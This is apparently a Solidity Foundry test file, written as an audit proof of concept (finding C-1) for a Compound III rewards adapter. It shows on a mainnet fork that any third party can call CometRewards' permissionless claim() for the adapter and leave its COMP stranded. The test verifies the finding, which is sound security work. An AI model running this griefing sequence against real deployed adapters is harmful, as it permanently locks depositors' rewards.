// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.34;

// KRAIT CRITIC SCRATCH POC (C-1 verification) — not part of the permanent suite.
// Verifies, against the REAL deployed Compound III CometRewards contract on a Base
// mainnet fork, that the permissionless `claim(comet, src, shouldAccrue)` entry
// point exists and pays `src` directly, bypassing the adapter's only modeled path
// (`claimTo`), and that the adapter has no way to recover COMP diverted this way.

import {Test} from "forge-std/Test.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CompoundV3Adapter} from "../../../../../src/modules/adapters/CompoundV3Adapter.sol";
import {ICompoundV3Adapter} from "../../../../../src/interfaces/adapters/ICompoundV3Adapter.sol";
import {Roles} from "../../../../../src/libraries/Roles.sol";

/// @dev Minimal stand-in for IBaseVault, just enough surface for ProtocolAdapter's constructor
/// (getAsset) and CompoundV3Adapter.claimRewards's role check (AccessControl.hasRole).
contract MockVaultForPoC is AccessControl {
    address internal immutable i_asset;

    constructor(address asset_) {
        i_asset = asset_;
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    function getAsset() external view returns (address) {
        return i_asset;
    }
}

/// @dev Minimal interface modeling the REAL Compound III CometRewards surface
/// (compound-finance/comet CometRewards.sol), beyond what the adapter's own
/// ICometRewards models (claimTo only).
interface IRealCometRewards {
    struct RewardOwed {
        address token;
        uint256 owed;
    }

    function getRewardOwed(address comet, address account) external returns (RewardOwed memory);
    function claim(address comet, address src, bool shouldAccrue) external;
    function claimTo(address comet, address src, address to, bool shouldAccrue) external;
}

contract KraitCriticCometRewardsPoCTest is Test {
    // Ethereum mainnet — same addresses/block the project's own fork tests use.
    // (Base's real USDC Comet market currently has baseTrackingSupplySpeed == 0 - no
    // supply-side rewards accrue there at all right now; Ethereum's market is active.)
    address internal constant ETH_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant ETH_COMET = 0xc3d688B66703497DAA19211EEdff47f25384cdc3;
    address internal constant ETH_COMET_REWARDS = 0x1B0e765F6224C21223AeA2af16c1C46E38885a40;
    uint256 internal constant ETHEREUM_FORK_BLOCK = 25110160;

    MockVaultForPoC internal vault;
    CompoundV3Adapter internal adapter;
    address internal rewardsOperator = makeAddr("rewardsOperator");
    address internal randomThirdParty = makeAddr("randomThirdParty");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_MAINNET_RPC_URL"), ETHEREUM_FORK_BLOCK);

        vault = new MockVaultForPoC(ETH_USDC);
        vault.grantRole(Roles.REWARDS_OPERATOR_ROLE, rewardsOperator);

        adapter = new CompoundV3Adapter(address(vault), ETH_COMET, ETH_COMET_REWARDS);

        // Fund and deposit through the adapter exactly as BaseVault would (vault-gated).
        deal(ETH_USDC, address(adapter), 1_000_000e6); // 1,000,000 USDC
        vm.prank(address(vault));
        adapter.deposit(1_000_000e6);

        // Let a real, meaningful amount of COMP rewards accrue on the real Comet market.
        vm.warp(block.timestamp + 180 days);
        vm.roll(block.number + 180 days / 12 seconds);
    }

    /// @notice Confirms the real CometRewards contract exposes a permissionless `claim()`
    /// that pays the adapter's own accrued COMP directly to the adapter, callable by
    /// ANY third party with zero authorization — and that once diverted this way, the
    /// adapter's only reward-handling function (`claimRewards` -> `claimTo`) cannot
    /// recover it.
    function test_KraitCritic_C1_permissionlessClaimDivertsAndStrandsRewards() public {
        IRealCometRewards realRewards = IRealCometRewards(ETH_COMET_REWARDS);

        IRealCometRewards.RewardOwed memory owedBefore = realRewards.getRewardOwed(ETH_COMET, address(adapter));
        assertGt(owedBefore.owed, 0, "sanity: adapter must have nonzero accrued rewards for this PoC to be meaningful");

        address rewardToken = owedBefore.token;
        uint256 adapterBalBefore = IERC20(rewardToken).balanceOf(address(adapter));
        uint256 thirdPartyBalBefore = IERC20(rewardToken).balanceOf(randomThirdParty);

        // Step 1: an arbitrary, completely unprivileged third party calls the REAL
        // CometRewards contract DIRECTLY — not through the adapter at all — using the
        // permissionless claim() entry point our adapter's ICometRewards never models.
        vm.prank(randomThirdParty);
        realRewards.claim(ETH_COMET, address(adapter), true);

        uint256 adapterBalAfter = IERC20(rewardToken).balanceOf(address(adapter));
        uint256 thirdPartyBalAfter = IERC20(rewardToken).balanceOf(randomThirdParty);

        // The reward landed on the ADAPTER (src), not on the caller.
        assertGt(
            adapterBalAfter,
            adapterBalBefore,
            "reward must be paid to src (adapter), confirming claim() pays src directly"
        );
        assertEq(thirdPartyBalAfter, thirdPartyBalBefore, "the permissionless caller must receive nothing themselves");

        uint256 divertedAmount = adapterBalAfter - adapterBalBefore;

        // Step 2: the reward is now checkpointed as claimed on the real CometRewards contract —
        // nothing further is owed for the adapter's position at this point.
        IRealCometRewards.RewardOwed memory owedAfterDiversion = realRewards.getRewardOwed(ETH_COMET, address(adapter));
        assertEq(owedAfterDiversion.owed, 0, "reward should be fully checkpointed/claimed after the direct claim()");

        // Step 3: REWARDS_OPERATOR_ROLE now tries to use the adapter's ONLY reward-handling
        // function. It can only move rewards accrued since the last checkpoint (now zero) —
        // it has no code path to sweep the adapter's own raw token balance.
        vm.prank(rewardsOperator);
        adapter.claimRewards(rewardsOperator);

        uint256 adapterBalFinal = IERC20(rewardToken).balanceOf(address(adapter));
        uint256 operatorBalFinal = IERC20(rewardToken).balanceOf(rewardsOperator);

        // The diverted COMP is still sitting on the adapter — claimTo could not recover it.
        assertEq(adapterBalFinal, adapterBalAfter, "adapter's diverted balance is untouched by claimRewards/claimTo");
        assertEq(operatorBalFinal, 0, "REWARDS_OPERATOR_ROLE received nothing - it cannot recover the diverted rewards");

        // And structurally: there is no sweep/rescue function on the adapter to reach it
        // via any other path either (verified independently by repo-wide grep in the audit).
        emit log_named_uint("COMP permanently stranded on adapter (wei)", divertedAmount);
    }
}
